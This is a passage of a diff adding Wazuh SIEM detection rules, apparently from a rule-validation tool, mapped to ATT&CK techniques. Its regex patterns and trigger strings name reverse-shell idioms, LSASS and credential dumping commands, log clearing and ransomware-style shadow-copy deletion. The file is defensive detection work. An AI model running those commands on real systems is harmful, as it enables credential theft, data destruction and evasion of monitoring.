+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101012",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "LINUX [T1548.003/T1098]: Critical identity/sudo/SSH file modified",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+                                       "syscheck"
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "linux",
+                                     "fim",
+                                     "critical_files"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "file",
+                                         "type":  "pcre2",
+                                         "pattern":  "^(/etc/sudoers|/etc/sudoers\\.d/|/etc/passwd|/etc/shadow|/etc/group|/etc/ssh/sshd_config|/etc/ld\\.so\\.preload)$"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101013",
+                      "level":  12,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "EXECUTION [T1059]: Linux reverse shell or curl/wget pipe-to-shell pattern",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+                                       "linux"
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "linux",
+                                     "execution",
+                                     "reverse_shell"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "data.command",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)((curl|wget).*\\|\\s*(sh|bash)|bash\\s+-i|/dev/tcp/|nc\\s+-e|ncat\\s+-e|python.*socket.*subprocess)"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101014",
+                      "level":  12,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "PRIVILEGE ESCALATION [T1611]: Privileged container or Docker socket mount",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+                                       "linux"
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "linux",
+                                     "container",
+                                     "privilege_escalation"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "data.command",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(docker|podman)\\s+run.*(--privileged|/var/run/docker\\.sock|--pid=host|--net=host)"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100825",
+                      "level":  10,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "SUPPLY CHAIN [T1195.002]: Package install with unsafe permissions",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "supply_chain"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "data.command",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(npm\\s+install|pip\\s+install|gem\\s+install)\\s+.*--(script|unsafe-perm|allow-root)"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100826",
+                      "level":  5,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "SUPPLY CHAIN [T1195.002]: Package manifest modified - noisy outside production release paths",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+                                       "syscheck"
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "supply_chain",
+                                     "noise_base"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "file",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(node_modules\\/[^\\/]+\\/package\\.json|site-packages\\/[^\\/]+\\/setup\\.py)"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100827",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "SUPPLY CHAIN [T1195.001]: Git remote configured to suspicious endpoint",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "supply_chain"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(git\\s+config.*url.*\\.(onion|bit)|git\\s+remote.*add.*http:\\/\\/[0-9]{1,3}\\.[0-9])"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "git config url.foo.onion.insteadOf https://github.com",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100840",
+                      "level":  6,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "INSIDER THREAT [T1078]: Off-hours login - base signal, requires enrichment/allowlists",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "insider_threat",
+                                     "noise_base"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.system.eventID",
+                                         "type":  "pcre2",
+                                         "pattern":  "^4624$"
+                                     },
+                                     {
+                                         "name":  "win.eventdata.logonHour",
+                                         "type":  "pcre2",
+                                         "pattern":  "^(00|01|02|03|04|05|22|23)$"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100841",
+                      "level":  11,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "EXFILTRATION [T1048]: Copy operation to network share by IP",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "insider_threat",
+                                     "collection"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(robocopy|xcopy|copy\\s+\\/[yz]).*\\\\\\\\\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "robocopy C:\\Temp \\\\192.0.2.10\\share",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100842",
+                      "level":  5,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "INSIDER THREAT [T1530]: SharePoint/OneDrive file download - base signal",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+                                       "office365"
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "insider_threat",
+                                     "cloud",
+                                     "noise_base"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "data.operation",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(FileDownloaded|FileSyncDownloadedFull)"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100843",
+                      "level":  8,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "INSIDER THREAT [T1078]: Explicit credential logon",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "insider_threat"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.system.eventID",
+                                         "type":  "pcre2",
+                                         "pattern":  "^4648$"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101015",
+                      "level":  12,
+                      "frequency":  25,
+                      "timeframe":  600,
+                      "description":  "EXFILTRATION [T1530]: Potential bulk SharePoint/OneDrive downloads by same user",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+                                             "100842"
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "insider_threat",
+                                     "cloud",
+                                     "exfiltration"
+                                 ],
+                      "fields":  [
+
+                                 ],
+                      "endpoint_method":  "correlation",
+                      "trigger_text":  null,
+                      "notes":  "Regula korelacyjna; runner odpala reguly podrzedne z tej samej grupy, jesli da sie je bezpiecznie zainicjowac na endpoincie.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100855",
+                      "level":  5,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "CREDENTIAL ACCESS [T1110]: Failed Windows logon - base signal for correlation",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access",
+                                     "brute_force",
+                                     "noise_base"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.system.eventID",
+                                         "type":  "pcre2",
+                                         "pattern":  "^4625$"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100856",
+                      "level":  12,
+                      "frequency":  10,
+                      "timeframe":  60,
+                      "description":  "CREDENTIAL ACCESS [T1110.001]: Brute force - multiple failed logons from same source IP",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+                                             "100855"
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access",
+                                     "brute_force"
+                                 ],
+                      "fields":  [
+
+                                 ],
+                      "endpoint_method":  "correlation",
+                      "trigger_text":  null,
+                      "notes":  "Regula korelacyjna; runner odpala reguly podrzedne z tej samej grupy, jesli da sie je bezpiecznie zainicjowac na endpoincie.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100857",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "CREDENTIAL ACCESS [T1555]: Password manager / credential store dumping",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(lazagne|credentialfileview|dumpCredStore|vault.*dump|keethief)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "lazagne credentialfileview dumpCredStore vault dump keethief",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100858",
+                      "level":  10,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "CREDENTIAL ACCESS [T1555.004]: Windows Credential Manager enumeration",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(cmdkey\\s+\\/list|vaultcmd\\s+\\/listcreds|windows\\s+credential\\s+manager)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "cmdkey /list vaultcmd /listcreds windows credential manager",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101016",
+                      "level":  14,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "CREDENTIAL ACCESS [T1003.001]: LSASS dump or credential extraction command",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access",
+                                     "lsass",
+                                     "critical"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(procdump.*-ma\\s+lsass|rundll32\\.exe\\s+.*comsvcs\\.dll.*MiniDump|taskmgr.*dump|sekurlsa::logonpasswords)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "procdump -ma lsass.exe rundll32.exe comsvcs.dll MiniDump sekurlsa::logonpasswords",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101017",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "CREDENTIAL ACCESS [T1003.001]: Sysmon process access to LSASS",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access",
+                                     "lsass",
+                                     "sysmon"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.system.eventID",
+                                         "type":  "pcre2",
+                                         "pattern":  "^10$"
+                                     },
+                                     {
+                                         "name":  "win.eventdata.targetImage",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)\\\\lsass\\.exe$"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100870",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "LATERAL MOVEMENT [T1021.006/T1569.002]: WMI/PsExec remote command execution",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "lateral_movement"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(wmic\\s+\\/node:|invoke-wmimethod\\s+-computer|psexec(64)?\\.exe\\s+\\\\\\\\)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "wmic /node:HOST process call create cmd.exe psexec.exe \\\\HOST",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100871",
+                      "level":  12,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "LATERAL MOVEMENT [T1021.006]: PowerShell remoting",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "lateral_movement"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(Enter-PSSession|New-PSSession|Invoke-Command\\s+-ComputerName|winrm\\s+invoke)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "Enter-PSSession New-PSSession Invoke-Command -ComputerName HOST winrm invoke",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100872",
+                      "level":  12,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "LATERAL MOVEMENT/PERSISTENCE [T1569.002/T1543.003]: Suspicious service installed",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "lateral_movement",
+                                     "persistence"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.system.eventID",
+                                         "type":  "pcre2",
+                                         "pattern":  "^7045$"
+                                     },
+                                     {
+                                         "name":  "win.eventdata.serviceFileName",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(\\\\temp\\\\|\\\\public\\\\|cmd\\.exe|powershell|pwsh|ADMIN\\$|PSEXESVC)"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100873",
+                      "level":  11,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "LATERAL MOVEMENT [T1021.002]: SMB network share mapping with credentials",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "lateral_movement"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(net\\s+use\\s+\\\\\\\\.+\\\\[a-z$]+\\s+\\/user:|mount\\s+\\\\\\\\.+\\\\[a-z$]+)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "net use \\\\192.0.2.10\\c$ /user:test placeholder",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101018",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "PERSISTENCE [T1053.005]: Scheduled task created or updated",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "persistence",
+                                     "scheduled_task"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.system.eventID",
+                                         "type":  "pcre2",
+                                         "pattern":  "^(4698|4702)$"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101019",
+                      "level":  12,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "PERSISTENCE [T1053.005]: Scheduled task creation command",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "persistence",
+                                     "scheduled_task"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(schtasks\\s+\\/create|New-ScheduledTask|Register-ScheduledTask)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "schtasks /create /tn WazuhRuleValidation /sc once /tr cmd.exe",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101020",
+                      "level":  15,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "DEFENSE EVASION [T1070.001]: Windows Security event log cleared",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "defense_evasion",
+                                     "log_clear",
+                                     "critical"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.system.eventID",
+                                         "type":  "pcre2",
+                                         "pattern":  "^1102$"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101021",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "DEFENSE EVASION [T1070.001/T1562.002]: Log clearing or audit policy tampering command",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "defense_evasion",
+                                     "log_clear"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(wevtutil\\s+cl|Clear-EventLog|Remove-EventLog|auditpol\\s+\\/set|auditpol\\s+\\/clear)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "wevtutil cl Security Clear-EventLog Remove-EventLog auditpol /clear",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101022",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "PERSISTENCE [T1098]: Member added to privileged group",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "persistence",
+                                     "identity",
+                                     "privileged_group"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.system.eventID",
+                                         "type":  "pcre2",
+                                         "pattern":  "^(4728|4732|4756)$"
+                                     },
+                                     {
+                                         "name":  "win.eventdata.targetUserName",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(Domain Admins|Enterprise Admins|Administrators|Schema Admins)"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101023",
+                      "level":  11,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "PERSISTENCE [T1136/T1098]: User created/enabled/password reset/account changed",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "persistence",
+                                     "identity",
+                                     "account_change"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.system.eventID",
+                                         "type":  "pcre2",
+                                         "pattern":  "^(4720|4722|4724|4738)$"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101024",
+                      "level":  14,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "IMPACT [T1490]: Ransomware preparation - backup/shadow copy/recovery tampering",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "impact",
+                                     "ransomware",
+                                     "critical"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(vssadmin\\s+delete\\s+shadows|wmic\\s+shadowcopy\\s+delete|wbadmin\\s+delete\\s+catalog|bcdedit\\s+\\/set\\s+.*recoveryenabled\\s+no|bcdedit\\s+\\/set\\s+.*bootstatuspolicy\\s+ignoreallfailures|cipher\\s+\\/w)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "vssadmin delete shadows /all /quiet wmic shadowcopy delete wbadmin delete catalog bcdedit /set recoveryenabled no cipher /w",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100900",
+                      "level":  14,
+                      "frequency":  2,
+                      "timeframe":  600,
+                      "description":  "KILL CHAIN [TA0001]: Multiple initial access indicators on same agent",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+                                               "initial_access"
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "kill_chain"
+                                 ],
+                      "fields":  [
+
+                                 ],
+                      "endpoint_method":  "correlation",
+                      "trigger_text":  null,
+                      "notes":  "Regula korelacyjna; runner odpala reguly podrzedne z tej samej grupy, jesli da sie je bezpiecznie zainicjowac na endpoincie.",
+                      "correlation_children":  [
+                                                   "100600",
+                                                   "100604"
+                                               ]
+                  },
+                  {
+                      "id":  "100901",
+                      "level":  15,
+                      "frequency":  2,
+                      "timeframe":  600,
+                      "description":  "KILL CHAIN [T1003.006]: Repeated DCSync indicators for same user",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+                                               "dcsync"
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "kill_chain",
+                                     "apt",
+                                     "critical"
+                                 ],
+                      "fields":  [
+
+                                 ],
+                      "endpoint_method":  "correlation",
+                      "trigger_text":  null,
+                      "notes":  "Regula korelacyjna; runner odpala reguly podrzedne z tej samej grupy, jesli da sie je bezpiecznie zainicjowac na endpoincie.",
+                      "correlation_children":  [
+                                                   "100660"
+                                               ]
+                  },
+                  {
+                      "id":  "100902",
+                      "level":  14,
+                      "frequency":  2,
+                      "timeframe":  600,
+                      "description":  "KILL CHAIN [T1558.003]: Multiple Kerberoasting indicators on same agent",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+                                               "kerberoasting"
+                                           ],
